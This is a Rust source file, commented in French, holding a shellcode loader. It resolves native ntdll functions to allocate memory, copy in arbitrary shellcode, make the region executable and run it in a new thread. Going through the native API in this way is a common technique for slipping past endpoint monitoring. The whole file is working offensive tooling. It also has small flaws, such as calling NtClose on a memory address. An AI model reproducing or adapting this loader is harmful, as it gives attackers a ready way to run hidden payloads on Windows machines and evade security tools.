use std::{ffi::c_void, ptr};

use crate::native::call::{get_ntdll_function, NtAllocateVirtualMemoryFn, NtProtectVirtualMemoryFn,
    RtlCreateUserThreadFn, NtWaitForSingleObjectFn, NtCloseFn, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ
};

pub fn execute_shellcode(shellcode: &[u8]) -> Result<(), String> {
    println!("[*] Exécution du shellcode via native API...");
    
    // Résolution des fonctions natives
    let nt_allocat_virtual_memory: NtAllocateVirtualMemoryFn = match get_ntdll_function("NtAllocateVirtualMemory") {
        Some(func) => func,
        None => return Err("Échec de récupération de NtAllocateVirtualMemory".to_string()),
    };

    let nt_protect_virtual_memory: NtProtectVirtualMemoryFn = match get_ntdll_function("NtProtectVirtualMemory") {
        Some(func) => func,
        None => return Err("Échec de récupération de NtProtectVirtualMemory".to_string()),
    };

    let rtl_create_create_user_thread: RtlCreateUserThreadFn = match get_ntdll_function("RtlCreateUserThread") {
        Some(func) => func,
        None => return Err("Échec de récupération de RtlCreateUserThread".to_string()),
    };

    let nt_wait_for_single_object: NtWaitForSingleObjectFn = match get_ntdll_function("NtWaitForSingleObject") {
        Some(func) => func,
        None => return Err("Échec de récupération de NtWaitForSingleObject".to_string()),
    };

    let nt_close: NtCloseFn = match get_ntdll_function("NtClose") {
        Some(func) => func,
        None => return Err("Échec de récupération de NtClose".to_string()),
    };

    // Exécution du shellcode via les API natives
    unsafe {
        println!("[*] Allocation de mémoire pour le shellcode...");
        let mut base_address: *mut c_void = ptr::null_mut();
        let mut region_size = shellcode.len();
        let zero_bits: usize = 0;

        let status = nt_allocat_virtual_memory(
            -1i32 as *mut c_void,
            &mut base_address,
            zero_bits,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,   // AllocationType
            PAGE_READWRITE,             // Protect
        );

        if status != 0 {
            return Err(format!("Échec de NtAllocateVirtualMemory: 0x{:X}", status));
        }

        println!("[*] Mémouire allouée à l'adresse: {:p}", base_address);

        // Copie du shellcode dans la mémoire allouée
        ptr::copy_nonoverlapping(shellcode.as_ptr(), base_address as *mut u8, shellcode.len());

        // Chargement des permissions d'exécution
        println!("Appel de NtProtectVirtualMemory pour définir les permissions d'exécution...");
        let mut old_protect: u32 = 0;
        let mut protect_address = base_address;
        let mut protect_size = shellcode.len();

        let status = nt_protect_virtual_memory(
            -1i32 as *mut c_void,  // Handle
            &mut protect_address,  // Address d'action
            &mut protect_size,     // Taille
            PAGE_EXECUTE_READ,     // Nouvelle protection
            &mut old_protect,      // Ancienne protection
        );

        if status != 0 {
            nt_close(base_address);
            return Err(format!("Échec de NtProtectVirtualMemory: 0x{:X}", status));
        }

        println!("Protections changées de 0x{:X} à PAGE_EXECUTE_READ", old_protect);

        // Création d'un thread pour exécuter le shellcode
        println!("[*] Création d'un thread pour exécuter le shellcode...");
        let mut thread_handle: *mut c_void = ptr::null_mut();

        let status = rtl_create_create_user_thread(
            -1i32 as *mut c_void,      // ProcessHandle (current)
            ptr::null_mut(),            // SecurityDescriptor
            0,                          // CreateSuspended (0 = non suspendu)
            0,                          // StackZeroBits
            ptr::null_mut(),            // StackReserve
            ptr::null_mut(),            // StackCommit
            base_address,               // StartAddress
            ptr::null_mut(),            // StartParameter
            &mut thread_handle,         // ThreadHandle
            ptr::null_mut(),            // ClientId
        );

        if status != 0 {
            nt_close(base_address);
            return Err(format!("Échec de RtlCreateUserThread: 0x{:X}", status));
        }

        println!("Thread créé avec succès. Handle: {:p}", thread_handle);

        // Attente de la fin du thread
        print!("[*] Appel de NtWaitForSignelObject...");
        let status = nt_wait_for_single_object(
            thread_handle,
            0,              // Alertable
            ptr::null_mut(),// Timeout
        );

        if status != 0 {
            return Err(format!("Échec de NtWaitForSingleObject: 0x{:X}", status));
        }else {
            println!("Thread terminé avec succès.");
        }

        // Nettoyage
        println!("[*] Nettoyage des handles...");
        nt_close(thread_handle);
        nt_close(base_address);

        println!("[*] Shellcode exécuté avec succès via les API natives.");
    }

    Ok(())

}